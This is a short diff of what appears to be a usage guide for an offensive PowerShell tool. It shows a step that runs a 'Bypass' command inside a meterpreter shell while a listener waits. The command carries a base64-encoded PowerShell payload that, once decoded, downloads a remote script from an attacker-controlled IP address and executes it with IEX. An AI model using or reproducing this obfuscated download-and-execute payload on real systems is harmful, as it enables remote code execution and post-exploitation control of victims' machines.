@@ -31,7 +31,7 @@ param (
 }
 ```
 
-Then run the Bypass in the meterpreter shell make sure you have a listener running.
+4. Then run the Bypass in the meterpreter shell make sure you have a listener running.
 
 ```powershell
 Bypass KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA3AC8AcgB1AG4AMwAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=
